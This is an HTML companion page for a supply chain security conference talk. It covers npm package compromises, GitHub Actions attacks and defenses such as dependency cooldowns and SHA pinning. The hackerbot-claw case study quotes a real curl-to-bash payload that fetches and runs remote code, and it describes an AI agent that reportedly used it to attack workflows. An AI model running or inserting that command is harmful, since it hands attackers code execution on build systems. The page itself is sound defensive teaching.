@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Talk companion for Can You Trust Your Software Supply Chain? — Queen City Con 2026, Kennedy Toomey.">
+  <link rel="stylesheet" href="styles.css">
+  <title>Can You Trust Your Software Supply Chain? | Queen City Con 2026</title>
+<script>
+  (function(h,o,u,n,d) {
+    h=h[d]=h[d]||{q:[],onReady:function(c){h.q.push(c)}}
+    d=o.createElement(u);d.async=1;d.src=n;d.crossOrigin=''
+    n=o.getElementsByTagName(u)[0];n.parentNode.insertBefore(d,n)
+  })(window,document,'script','https://www.datadoghq-browser-agent.com/us1/v7/datadog-rum.js','DD_RUM')
+  window.DD_RUM.onReady(function() {
+    window.DD_RUM.init({
+        applicationId: 'b2d3ce9e-ee16-4cd9-9fed-85a76501aef6',
+        clientToken: 'pub014e855516a4c3e8823e714bc8ddeca3',
+        remoteConfiguration: {
+            id: 'e35ac1fb-7d6c-4e6d-bc45-bae72a7617e8',
+        },
+        site: 'datadoghq.com',
+        service: 'queencitycon',
+        env: 'prod',				// e.g. 'prod', 'staging-1', 'dev'
+        version: '1.0.0',	// e.g. '1.0.0'
+        sessionSampleRate: 100,			// capture 100% of sessions
+        sessionReplaySampleRate: 20,	// capture 20% of sessions with replay
+        trackResources: true,			// Enable Resource tracking
+        trackUserInteractions: true,	// Enable Action tracking
+        trackLongTasks: true,			// Enable Long Tasks tracking
+    
+        // ----- Recommended Options -----
+        // allowedTracingUrls: '<BACKEND_URL>',		// Enable distributed tracing
+        // defaultPrivacyLevel: 'mask-user-input',	// 'mask-user-input' | 'allow' | 'mask'
+    });
+  })
+</script>
+</head>
+<body>
+
+<header>
+  <a class="conference-tag" href="https://queencitycon.org/" target="_blank" rel="noopener">Queen City Con · November 2026</a>
+</header>
+
+<!-- HERO -->
+<div class="hero-wrap">
+<section class="hero">
+  <p class="hero-eyebrow">Talk · Software Supply Chain Security</p>
+  <h1>Can You Trust Your<br><span>Software Supply Chain?</span></h1>
+  <p class="hero-sub">
+    Phished maintainers, poisoned GitHub Actions, and malicious packages that go live within hours.
+    This talk shows how recent attacks abused the trust built into modern software delivery,
+    and what you can do about it today.
+  </p>
+  <div class="hero-actions">
+    <a href="can-you-trust-your-software-supply-chain.pdf" class="btn btn-primary" target="_blank" rel="noopener">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zm4 18H6V4h7v5h5v11z"/></svg>
+      View Slides
+    </a>
+    <a href="#overview" class="btn btn-outline">Talk Highlights</a>
+    <a href="#takeaways" class="btn btn-outline">Jump to Takeaways</a>
+  </div>
+</section>
+</div>
+
+<!-- SPEAKER BAR -->
+<div class="speaker-bar">
+  <div class="speaker-bar-inner">
+    <img src="dd_icon_white.png" alt="Datadog" style="height:32px; display:block;">
+    <div class="speakers">
+      <div class="speaker">
+        <div class="speaker-info">
+          <strong>Kennedy Toomey</strong>
+          <span>Application Security Researcher &amp; Advocate @ Datadog</span>
+        </div>
+        <div class="speaker-links inline">
+          <a class="speaker-linkedin" href="https://www.linkedin.com/in/kennedy-toomey" target="_blank" rel="noopener">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M19 0h-14c-2.76 0-5 2.24-5 5v14c0 2.76 2.24 5 5 5h14c2.76 0 5-2.24 5-5v-14c0-2.76-2.24-5-5-5zm-11 19h-3v-10h3v10zm-1.5-11.27c-.97 0-1.75-.79-1.75-1.76s.78-1.75 1.75-1.75 1.75.78 1.75 1.75-.78 1.76-1.75 1.76zm13.5 11.27h-3v-5.6c0-1.34-.03-3.07-1.87-3.07-1.87 0-2.16 1.46-2.16 2.97v5.7h-3v-10h2.88v1.36h.04c.4-.76 1.38-1.56 2.84-1.56 3.04 0 3.6 2 3.6 4.59v5.61z"/></svg>
+            LinkedIn
+          </a>
+          <a class="speaker-linkedin" href="https://kennedytoomey.github.io/" target="_blank" rel="noopener">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+            Website
+          </a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- MAIN -->
+<main id="overview">
+
+  <p class="section-label">Talk Overview</p>
+  <h2 class="section-title">I've Got Trust Problems</h2>
+  <p class="section-desc">
+    Every modern build trusts thousands of people, packages, and pipelines it never checks.
+    This walkthrough follows the talk: where that trust lives, how attackers abused it, and what to change today.
+  </p>
+
+  <div class="track">
+
+    <!-- 01 -->
+    <div class="track-item featured">
+      <div class="track-item-inner">
+        <div class="track-number">01 · The Shift</div>
+        <div class="track-kicker">From vulnerable code to compromised code</div>
+        <h3 class="track-heading">The Threat Has Changed</h3>
+        <div class="track-body">
+          <div class="cards two">
+            <div class="card">
+              <div class="card-label">In the past</div>
+              <div class="card-title">Vulnerable code</div>
+              <ul>
+                <li>Vulnerabilities in dependencies</li>
+              </ul>
+            </div>
+            <div class="card c-creds">
+              <div class="card-label">Now</div>
+              <div class="card-title">Compromised code</div>
+              <ul>
+                <li>Vulnerabilities in dependencies</li>
+                <li>Compromised dependencies</li>
+                <li>Compromised GitHub Actions</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 02 -->
+    <div class="track-item">
+      <div class="track-item-inner">
+        <div class="track-number">02 · Recent Compromises</div>
+        <div class="track-kicker">What do all of these have in common?</div>
+        <h3 class="track-heading">A Year of Supply Chain Attacks</h3>
+        <div class="track-body">
+          <div class="cards two">
+            <div class="card c-input">
+              <div class="card-label">Dependency registries</div>
+              <div class="card-title">Malicious packages</div>
+              <ul>
+                <li><strong>Shai-Hulud</strong></li>
+                <li><strong>s1ngularity</strong></li>
+                <li><strong>Axios</strong></li>
+                <li><strong>LiteLLM</strong> (twice)</li>
+              </ul>
+            </div>
+            <div class="card c-pwn">
+              <div class="card-label">Workflow &amp; CI/CD security</div>
+              <div class="card-title">GitHub Actions</div>
+              <ul>
+                <li><strong>tj-actions</strong>: third-party action vulnerability</li>
+                <li><strong>Trivy</strong>: security scanner integration compromise</li>
+                <li><strong>KICS</strong>: IaC analysis action compromise</li>
+                <li><strong>hackerbot-claw</strong>: AI-powered attacks</li>
+              </ul>
+            </div>
+          </div>
+          <div class="callout">
+            <strong>The common thread</strong>
+            Trust.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 03 -->
+    <div class="track-item">
+      <div class="track-item-inner">
+        <div class="track-number">03 · Mapping the Trust Chain</div>
+        <div class="track-kicker">Where do we implicitly trust in software?</div>
+        <h3 class="track-heading">Thousands of Implicit Trust Decisions</h3>
+        <div class="track-body">
+          <p>The modern software supply chain runs from source to build to deployment, and nearly every step depends on something you didn't write or check.</p>
+          <div class="tags">
+            <span>Open source maintainers</span>
+            <span>Package registries</span>
+            <span>GitHub repositories</span>
+            <span>GitHub Actions</span>
+            <span>CI/CD pipelines</span>
+            <span>Build artifacts</span>
+            <span>Container registries</span>
+            <span>Cloud environments</span>
+          </div>
+          <div class="callout">
+            <strong>Thousands of implicit trust decisions.</strong>
+            Attackers only need one.
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://slsa.dev/" target="_blank" rel="noopener">SLSA: Supply-chain Levels for Software Artifacts</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 04 -->
+    <div class="track-item featured">
+      <div class="track-item-inner">
+        <div class="track-number">04 · What Recent Attacks Teach Us</div>
+        <div class="track-kicker">Three trends</div>
+        <h3 class="track-heading">Attackers Target Maintainers, Automation, and Speed</h3>
+        <div class="track-body">
+          <div class="cards">
+            <div class="card c-creds">
+              <div class="card-label">Trend 01</div>
+              <div class="card-title">Maintainers</div>
+              Qix compromise, Axios compromise, social engineering campaigns.
+            </div>
+            <div class="card c-input">
+              <div class="card-label">Trend 02</div>
+              <div class="card-title">Automation</div>
+              CI/CD vulnerabilities, GitHub Action tagging, auto-installed packages.
+            </div>
+            <div class="card c-warn">
+              <div class="card-label">Trend 03</div>
+              <div class="card-title">Speed</div>
+              Malicious npm packages and rapid package publication.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 05 -->
+    <div class="track-item c-creds">
+      <div class="track-item-inner">
+        <div class="track-number">05 · Trend 01 · <span>Maintainers</span></div>
+        <div class="track-kicker">A phishing email, 18 packages</div>
+        <h3 class="track-heading">Qix Compromised</h3>
+        <div class="track-body">
+          <div class="flow">
+            <div class="card">
+              <div class="card-label">01 / Initial access</div>
+              A 2FA reset phishing email posing as npm support.
+            </div>
+            <div class="card">
+              <div class="card-label">02 / Payload</div>
+              A crypto stealer installed in 18 npm packages, including <code>debug</code> and <code>chalk</code>.
+            </div>
+            <div class="card">
+              <div class="card-label">03 / Blast radius</div>
+              2.5M malicious downloads.
+            </div>
+            <div class="card">
+              <div class="card-label">04 / Remediation</div>
+              Taken down in about 5 hours.
+            </div>
+          </div>
+          <div class="stats">
+            <div class="stat"><strong>2.5M</strong>malicious downloads</div>
+            <div class="stat"><strong>~5 hrs</strong>time to takedown</div>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://securitylabs.datadoghq.com/articles/learnings-from-recent-npm-compromises/" target="_blank" rel="noopener">Learnings from Recent npm Compromises</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 06 -->
+    <div class="track-item c-creds">
+      <div class="track-item-inner">
+        <div class="track-number">06 · Trend 01 · <span>Maintainers</span></div>
+        <div class="track-kicker">100M+ weekly downloads</div>
+        <h3 class="track-heading">Axios Compromised</h3>
+        <div class="track-body">
+          <div class="stats">
+            <div class="stat"><strong>2</strong>vulnerable versions released</div>
+            <div class="stat"><strong>RAT</strong>remote access trojan installed</div>
+            <div class="stat"><strong>~3 hrs</strong>time to takedown</div>
+            <div class="stat"><strong>100M+</strong>weekly downloads, with 174,000+ dependent packages downstream</div>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://securitylabs.datadoghq.com/articles/axios-npm-supply-chain-compromise/" target="_blank" rel="noopener">Datadog Security Labs: Axios npm Supply Chain Compromise</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 07 -->
+    <div class="track-item c-creds">
+      <div class="track-item-inner">
+        <div class="track-number">07 · Trend 01 · <span>Maintainers</span></div>
+        <div class="track-kicker">Social engineering campaigns</div>
+        <h3 class="track-heading">Targeting High-Impact Maintainers</h3>
+        <div class="track-body">
+          <div class="flow">
+            <div class="card">
+              <div class="card-label">01</div>
+              A Slack invite.
+            </div>
+            <div class="card">
+              <div class="card-label">02</div>
+              A scheduled video call.
+            </div>
+            <div class="card">
+              <div class="card-label">03</div>
+              A broken link prompts a new app download.
+            </div>
+            <div class="card">
+              <div class="card-label">04</div>
+              An info stealer is installed.
+            </div>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://socket.dev/blog/attackers-hunting-high-impact-nodejs-maintainers#How-the-Attack-Works" target="_blank" rel="noopener">Socket: Attackers Hunting High-Impact Node.js Maintainers</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 08 -->
+    <div class="track-item c-input">
+      <div class="track-item-inner">
+        <div class="track-number">08 · Trend 02 · <span>Automation</span></div>
+        <div class="track-kicker">CI/CD vulnerabilities</div>
+        <h3 class="track-heading">Common CI/CD Vulnerabilities</h3>
+        <div class="track-body">
+          <div class="cards">
+            <div class="card c-pwn">
+              <div class="card-title">Pwn request</div>
+              <p>A workflow uses a risky trigger with elevated privileges, handing out repo write permissions or access to secrets.</p>
+              <div class="card-foot"><strong>Seen in the wild:</strong> s1ngularity</div>
+            </div>
+            <div class="card c-input">
+              <div class="card-title">Injections</div>
+              <p>A workflow passes data through shell commands, left unvalidated and vulnerable to remote code execution.</p>
+              <div class="card-foot"><strong>Seen in the wild:</strong> hackerbot-claw</div>
+            </div>
+            <div class="card c-creds">
+              <div class="card-title">Compromised credentials</div>
+              <p>A maintainer token or publishing credential is stolen, and the trusted action itself starts shipping malicious releases.</p>
+              <div class="card-foot"><strong>Seen in the wild:</strong> Trivy, KICS</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 09 -->
+    <div class="track-item c-pwn">
+      <div class="track-item-inner">
+        <div class="track-number">09 · Case Study · <span>Pwn Request</span></div>
+        <div class="track-kicker">From a PR to npm</div>
+        <h3 class="track-heading">s1ngularity</h3>
+        <div class="track-body">
+          <div class="flow">
+            <div class="card">
+              <div class="card-label">01</div>
+              <div class="card-title">Malicious PR</div>
+              A pwn request against a risky workflow.
+            </div>
+            <div class="card">
+              <div class="card-label">02</div>
+              <div class="card-title">Token stolen</div>
+              A read/write access token was exposed.
+            </div>
+            <div class="card">
+              <div class="card-label">03</div>
+              <div class="card-title">Malicious package</div>
+              Malicious versions shipped to npm.
+            </div>
+            <div class="card">
+              <div class="card-label">04</div>
+              <div class="card-title">Spreading wider</div>
+              Stolen secrets pushed to public repos.
+            </div>
+          </div>
+          <div class="stats">
+            <div class="stat"><strong>2,000+</strong>accounts exposed</div>
+            <div class="stat"><strong>7,200+</strong>repositories exposed</div>
+          </div>
+          <div class="cards two">
+            <div class="card">
+              <div class="card-label">Lesson</div>
+              <strong>Fixing forward isn't enough.</strong> The attacker targeted an outdated branch.
+            </div>
+            <div class="card">
+              <div class="card-label">Lesson</div>
+              Avoid <code>pull_request_target</code>.
+            </div>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://www.wiz.io/blog/s1ngularity-supply-chain-attack" target="_blank" rel="noopener">Wiz: s1ngularity Supply Chain Attack</a></li>
+              <li><a href="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/" target="_blank" rel="noopener">GitHub Security Lab: Preventing Pwn Requests</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 10 -->
+    <div class="track-item c-input">
+      <div class="track-item-inner">
+        <div class="track-number">10 · Case Study · <span>Injection</span></div>
+        <div class="track-kicker">February 21 – March 2, 2026</div>
+        <h3 class="track-heading">hackerbot-claw: An AI Agent Hunting Workflows</h3>
+        <div class="track-body">
+          <p>An AI agent designed to exploit vulnerabilities in GitHub Actions and LLM-powered workflows. It claimed to use Anthropic's Opus 4.5 model and targeted open source projects through malicious pull requests, issues, and comments.</p>
+          <div class="stats">
+            <div class="stat"><strong>16</strong>pull requests opened</div>
+            <div class="stat"><strong>2</strong>issues opened</div>
+            <div class="stat"><strong>8</strong>comments posted on targets</div>
+            <div class="stat"><strong>9</strong>repositories across 6 organizations</div>
+          </div>
+          <p style="margin-top: 1rem;"><strong>Same payload, different injection locations.</strong></p>
+<pre><code>curl -sSfL hackmoltrepeat.com/molt | bash</code></pre>
+          <div class="tags">
+            <span>Branch-name injection</span>
+            <span>Filename injection</span>
+            <span>Direct script injection</span>
+            <span>Prompt injection</span>
+            <span>Pwn request</span>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation" target="_blank" rel="noopener">StepSecurity: hackerbot-claw GitHub Actions Exploitation</a></li>
+              <li><a href="https://www.datadoghq.com/blog/engineering/stopping-hackerbot-claw-with-bewaire/" target="_blank" rel="noopener">Datadog: Stopping hackerbot-claw with BewAIre</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 11 -->
+    <div class="track-item c-creds">
+      <div class="track-item-inner">
+        <div class="track-number">11 · Case Study · <span>Compromised Credentials</span></div>
+        <div class="track-kicker">March 2026</div>
+        <h3 class="track-heading">Trivy and KICS via TeamPCP</h3>
+        <div class="track-body">
+          <div class="stats">
+            <div class="stat"><strong>75</strong>Trivy tags poisoned (Mar 19)</div>
+            <div class="stat"><strong>2</strong>Checkmarx open source actions compromised (Mar 23)</div>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know" target="_blank" rel="noopener">Aqua Security: Trivy Supply Chain Attack, What You Need to Know</a></li>
+              <li><a href="https://checkmarx.com/blog/ongoing-security-updates" target="_blank" rel="noopener">Checkmarx: Ongoing Security Updates</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 12 -->
+    <div class="track-item c-input">
+      <div class="track-item-inner">
+        <div class="track-number">12 · Trend 02 · <span>Automation</span></div>
+        <div class="track-kicker">A tag is a pointer, not a version</div>
+        <h3 class="track-heading">GitHub Action Versioning</h3>
+        <div class="track-body">
+<pre><code><span class="cm"># pinning to a tag</span>
+<span class="k">uses</span>: <span class="s">thollander/actions-comment-pull-request</span><span class="v">@v2</span></code></pre>
+          <ul>
+            <li><strong>A tag is a pointer, not a version.</strong> Anyone with write access to the action's repo can move the tag to new code. Your workflow follows it silently.</li>
+            <li><strong>You can't answer "what ran?"</strong> No pinned hash means no record of the code that touched your secrets last Tuesday.</li>
+            <li><strong>Updates arrive without review.</strong> A maintainer change, a compromised account, a new transitive dependency, all shipped straight into your runner.</li>
+          </ul>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://docs.github.com/en/actions/how-tos/secure-your-work/lock-workflow-dependencies" target="_blank" rel="noopener">GitHub Docs: Lock Workflow Dependencies</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 13 -->
+    <div class="track-item c-input">
+      <div class="track-item-inner">
+        <div class="track-number">13 · Trend 02 · <span>Automation</span></div>
+        <div class="track-kicker">Whatever's newest, installed automatically</div>
+        <h3 class="track-heading">Auto-Install Dependencies</h3>
+        <div class="track-body">
+          <div class="bar-figure">
+            <div class="bar-title">Percentage of organizations running dependencies less than 24 hours old</div>
+            <div class="bar" role="img" aria-label="60% of organizations run dependencies less than 24 hours old.">
+              <div class="some" style="flex: 60;">60%</div>
+              <div style="flex: 40; background: var(--bg-card2);"></div>
+            </div>
+            <div class="bar-legend">
+              <span style="--sw:#2563eb">Running dependencies less than 24 hours old</span>
+            </div>
+            <div class="bar-source">Note: Data reflects September 2026. Source: Datadog</div>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://www.datadoghq.com/state-of-cloud-security/" target="_blank" rel="noopener">Datadog's State of Cloud Security</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 14 -->
+    <div class="track-item c-warn">
+      <div class="track-item-inner">
+        <div class="track-number">14 · Trend 03 · <span>Speed</span></div>
+        <div class="track-kicker">Rapid package publication</div>
+        <h3 class="track-heading">Malicious Package Spray</h3>
+        <div class="track-body">
+          <p>Attackers know their malicious packages will be taken down. They publish fast and wide anyway, to hit as many people as possible before that happens.</p>
+          <div class="callout">
+            <strong>Newer isn't safer</strong>
+            Most malicious packages are detected within <strong style="display:inline;">hours</strong> of publication.
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://www.datadoghq.com/state-of-devsecops/" target="_blank" rel="noopener">Datadog: 2026 State of DevSecOps</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 15 -->
+    <div class="track-item featured c-good" id="cooldowns">
+      <div class="track-item-inner">
+        <div class="track-number">15 · The Fix · <span>Dependency Cooldowns</span></div>
+        <div class="track-kicker">A simple waiting period dramatically reduces risk</div>
+        <h3 class="track-heading">Implementing Dependency Cooldowns</h3>
+        <div class="track-body">
+          <div class="flow" style="grid-template-columns: repeat(3, 1fr);">
+            <div class="card">
+              <div class="card-label">01</div>
+              <div class="card-title">Delay</div>
+              Don't install a release the moment it's published.
+            </div>
+            <div class="card">
+              <div class="card-label">02</div>
+              <div class="card-title">Review</div>
+              Give the community and scanners time to catch it.
+            </div>
+            <div class="card">
+              <div class="card-label">03</div>
+              <div class="card-title">Reduce exposure</div>
+              Skip the window when most malicious packages live.
+            </div>
+          </div>
+          <p style="margin-top: 1.25rem;"><strong>Turn it on today</strong></p>
+          <div class="code-pair three">
+            <div>
+              <div class="code-label">Dependabot</div>
+<pre><code><span class="k">updates</span>:
+  - <span class="k">package-ecosystem</span>: <span class="s">npm</span>
+    <span class="k">cooldown</span>:
+      <span class="k">default-days</span>: <span class="v">7</span></code></pre>
+            </div>
+            <div>
+              <div class="code-label">npm</div>
+<pre><code><span class="cm"># .npmrc</span>
+<span class="k">min-release-age</span>=<span class="v">7</span></code></pre>
+            </div>
+            <div>
+              <div class="code-label">yarn</div>
+<pre><code><span class="cm"># .yarnrc.yml</span>
+<span class="k">npmMinimalAgeGate</span>: <span class="v">"7d"</span></code></pre>
+            </div>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://securitylabs.datadoghq.com/articles/dependency-cooldowns/" target="_blank" rel="noopener">Datadog Security Labs: Dependency Cooldowns</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 16 -->
+    <div class="track-item">
+      <div class="track-item-inner">
+        <div class="track-number">16 · Hardening GitHub Actions</div>
+        <div class="track-kicker">The blind spot</div>
+        <h3 class="track-heading">We Review the App, Not the Automation</h3>
+        <div class="track-body">
+          <div class="cards two">
+            <div class="card c-good">
+              <div class="card-label">Most organizations</div>
+              <ul>
+                <li>Review application code</li>
+                <li>Scan dependencies</li>
+              </ul>
+            </div>
+            <div class="card c-creds">
+              <div class="card-label">But rarely</div>
+              <ul>
+                <li>Review workflow code</li>
+                <li>Secure automation permissions</li>
+              </ul>
+            </div>
+          </div>
+          <p style="margin-top: 1.1rem;"><strong>Common risks</strong></p>
+          <div class="tags">
+            <span>Third-party actions</span>
+            <span>Mutable tags</span>
+            <span>Excessive permissions</span>
+            <span>Secret exposure</span>
+            <span>Workflow injection</span>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://securitylabs.datadoghq.com/articles/case-for-github-actions-security/" target="_blank" rel="noopener">Datadog Security Labs: The Case for GitHub Actions Security</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 17 -->
+    <div class="track-item c-good">
+      <div class="track-item-inner">
+        <div class="track-number">17 · The Fix · <span>Hardening GitHub Actions</span></div>
+        <div class="track-kicker">Five practical defenses</div>
+        <h3 class="track-heading">Practical Defenses</h3>
+        <div class="track-body">
+          <div class="cards">
+            <div class="card c-input">
+              <div class="card-label">01</div>
+              <div class="card-title">Pin actions by SHA</div>
+            </div>
+            <div class="card c-creds">
+              <div class="card-label">02</div>
+              <div class="card-title">Least-privilege permissions</div>
+            </div>
+            <div class="card c-warn">
+              <div class="card-label">03</div>
+              <div class="card-title">Restrict secrets</div>
+            </div>
+            <div class="card">
+              <div class="card-label">04</div>
+              <div class="card-title">Monitor workflow changes</div>
+            </div>
+            <div class="card c-good">
+              <div class="card-label">05</div>
+              <div class="card-title">Treat workflows like production code</div>
+            </div>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions" target="_blank" rel="noopener">GitHub Docs: Security Hardening for GitHub Actions</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 18 -->
+    <div class="track-item">
+      <div class="track-item-inner">
+        <div class="track-number">18 · Platform</div>
+        <div class="track-kicker">Platform changes</div>
+        <h3 class="track-heading">GitHub Is Making Changes</h3>
+        <div class="track-body">
+          <div class="cards">
+            <div class="card">
+              <div class="card-label">Initial compromise</div>
+              <div class="card-title">Limiting trust</div>
+              <ul>
+                <li><code>actions/checkout</code> prevents checking out untrusted code from forks</li>
+                <li>New policies limit who triggers risky actions and which triggers are permitted</li>
+                <li>Actions cache is read-only for untrusted triggers</li>
+              </ul>
+            </div>
+            <div class="card c-input">
+              <div class="card-label">Exfiltrating credentials</div>
+              <div class="card-title">Actions network firewall</div>
+              <ul>
+                <li>A new network firewall (preview) logs all outbound traffic to detect malicious behavior</li>
+              </ul>
+            </div>
+            <div class="card c-warn">
+              <div class="card-label">Propagating the attack</div>
+              <div class="card-title">Barriers to expansion</div>
+              <ul>
+                <li>Dependabot has a default dependency cooldown of 3 days</li>
+                <li>Potentially malicious workflows are held for approval</li>
+                <li>Workflow-level dependency locking</li>
+                <li>Immutable releases</li>
+              </ul>
+            </div>
+            <div class="card c-creds">
+              <div class="card-label">Incident response</div>
+              <div class="card-title">Easier token rotation</div>
+              <ul>
+                <li>Self-service credential revocation</li>
+                <li>Expanded credential revocation API support</li>
+              </ul>
+            </div>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://github.blog/security/supply-chain-security/disrupting-supply-chain-attacks-on-npm-and-github-actions/" target="_blank" rel="noopener">GitHub Blog: Disrupting Supply Chain Attacks on npm and GitHub Actions</a></li>
+              <li><a href="https://github.blog/changelog/2026-07-28-github-actions-holds-potentially-malicious-workflows-for-approval/" target="_blank" rel="noopener">GitHub Changelog: Potentially Malicious Workflows Held for Approval</a></li>
+              <li><a href="https://github.blog/changelog/2026-10-14-github-actions-workflow-lockfiles-in-public-preview/" target="_blank" rel="noopener">GitHub Changelog: Workflow Lockfiles in Public Preview</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 19 -->
+    <div class="track-item featured" id="takeaways">
+      <div class="track-item-inner">
+        <div class="track-number">19 · Takeaways</div>
+        <div class="track-kicker">Three things, in this order</div>
+        <h3 class="track-heading">Audit What You Implicitly Trust</h3>
+        <div class="track-body">
+          <div class="checklist">
+            <div class="check">
+              <div class="check-box"><svg viewBox="0 0 10 10"><polyline points="1,5 4,8 9,2" stroke="#6d28d9" stroke-width="1.5" fill="none"/></svg></div>
+              <span><strong>Take inventory.</strong> What are you currently trusting?</span>
+            </div>
+            <div class="check">
+              <div class="check-box"><svg viewBox="0 0 10 10"><polyline points="1,5 4,8 9,2" stroke="#6d28d9" stroke-width="1.5" fill="none"/></svg></div>
+              <span><strong>Easy wins first.</strong> Add cooldowns, pin versions, then widen scope.</span>
+            </div>
+            <div class="check">
+              <div class="check-box"><svg viewBox="0 0 10 10"><polyline points="1,5 4,8 9,2" stroke="#6d28d9" stroke-width="1.5" fill="none"/></svg></div>
+              <span><strong>Make it repeatable.</strong> Add checks and document trust decisions.</span>
+            </div>
+          </div>
+          <div class="cards two" style="margin-top: 1.1rem;">
+            <div class="card c-warn">
+              <div class="card-label">Not the lesson</div>
+              Software is inherently insecure.
+            </div>
+            <div class="card c-good">
+              <div class="card-label">The lesson</div>
+              <strong>Audit what you implicitly trust.</strong>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- CLOSING -->
+  <div class="closing">
+    <p>If your strategy assumes your supply chain is trustworthy,</p>
+    <p>attackers are already ahead.</p>
+  </div>
+
+  <!-- SLIDES CTA -->
+  <div class="slides-cta" id="slides">
+    <div class="slides-text">
+      <strong>Presentation Slides</strong>
+      <span>Full deck from Queen City Con 2026</span>
+    </div>
+    <a href="can-you-trust-your-software-supply-chain.pdf" class="btn btn-primary" target="_blank" rel="noopener">
+      Download PDF
+    </a>
+  </div>
+
+  <!-- LEARN MORE -->
+  <div class="learn-more-section">
+    <div class="learn-more-inner">
+      <img src="dd_icon_white.png" alt="Datadog" style="height:36px; display:block; opacity:0.9;">
+      <div class="learn-more-text">
+        <strong>Want to learn more from other Datadog Security Researchers?</strong>
+        <p>Datadog Security Labs publishes original security research, threat intelligence, and in-depth technical analysis.</p>
+      </div>
+      <a href="https://securitylabs.datadoghq.com/" class="btn btn-primary" target="_blank" rel="noopener">
+        Visit Security Labs →
+      </a>
+    </div>
+  </div>
+
+</main>
+
+<footer>
+  <p>
+    Presented at <a href="https://queencitycon.org/" target="_blank" rel="noopener">Queen City Con 2026</a>
+    &nbsp;·&nbsp;
+    Kennedy Toomey
+    &nbsp;·&nbsp;
+    <a href="https://www.linkedin.com/in/kennedy-toomey" target="_blank" rel="noopener">LinkedIn</a>
+    &nbsp;·&nbsp;
+    <a href="https://kennedytoomey.github.io/" target="_blank" rel="noopener">Website</a>
+  </p>
+</footer>
+
+</body>
+</html>
